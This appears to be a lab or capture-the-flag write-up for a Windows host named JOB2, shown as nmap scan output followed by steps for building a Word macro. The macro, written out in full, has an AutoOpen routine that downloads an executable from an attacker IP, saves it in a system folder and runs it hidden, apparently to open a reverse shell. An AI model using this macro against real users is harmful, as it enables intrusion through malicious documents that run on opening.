# Enumeration
```
PORT      STATE SERVICE              VERSION
22/tcp    open  ssh                  OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 a3:94:77:ca:16:0e:ec:fb:23:86:67:c6:0a:e3:ca:7b (RSA)
|   256 0e:2a:31:70:94:99:5d:95:d4:f8:40:d5:b5:36:8e:88 (ECDSA)
|_  256 29:31:2a:c3:55:b2:f7:73:f2:d3:bd:bc:c5:c1:14:f0 (ED25519)
25/tcp    open  smtp                 hMailServer smtpd
| smtp-commands: JOB2, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
111/tcp   open  rpcbind
135/tcp   open  msrpc                Microsoft Windows RPC
139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
443/tcp   open  ssl/http             Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=www.job2.vl
| Subject Alternative Name: DNS:job2.vl, DNS:www.job2.vl
| Not valid before: 2023-05-09T13:31:40
|_Not valid after:  2122-05-09T13:41:37
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
445/tcp   open  microsoft-ds?
1063/tcp  open  rpcbind
2049/tcp  open  rpcbind
3389/tcp  open  ms-wbt-server        Microsoft Terminal Services
|_ssl-date: 2024-04-06T10:06:54+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=JOB2
| Not valid before: 2024-04-05T09:19:48
|_Not valid after:  2024-10-05T09:19:48
10001/tcp open  msexchange-logcopier Microsoft Exchange 2010 log copier
10002/tcp open  msexchange-logcopier Microsoft Exchange 2010 log copier
10003/tcp open  storagecraft-image   StorageCraft Image Manager
Service Info: Host: JOB2; OS: Windows; CPE: cpe:/o:microsoft:windows

```

There is a website at www.job2.vl
![](attachment/c5948a9829051685697bf41dbf41a508.png)
Using this https://github.com/S3cur3Th1sSh1t/OffensiveVBA for macro payload
And following these guidelines:
1. Enable Developer Tools in the Ribbon Menu to gain access to macros
2. Name your Macro AutoOpen() if you are working with Word 2016+
3. Select the Current Document as the place to store the Macro
4. Don't use .docx as the file extension since it won't allow for embedded macros. Either use .doc or .docm
5. When using the 64 bit version of Microsoft Word, Declare VBA functions with "PtrSafe" to avoid compilation errors.
```VBScript
Private Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" ( _
    ByVal pCaller As Long, _
    ByVal szURL As String, _
    ByVal szFileName As String, _
    ByVal dwReserved As Long, _
    ByVal lpfnCB As Long) As Long

Private Declare PtrSafe Function WinExec Lib "kernel32" ( _
    ByVal lpCmdLine As String, _
    ByVal uCmdShow As Long) As Long

Sub AutoOpen()
    URLDownloadToFileA 0, "http://10.8.0.123/rcat.exe", "C:\Windows\system32\spool\drivers\color\rcat_10.8.0.123_443.exe", 0, 0
    WinExec "C:\Windows\system32\spool\drivers\color\rcat_10.8.0.123_443.exe", SHOW_HIDE
End Sub
```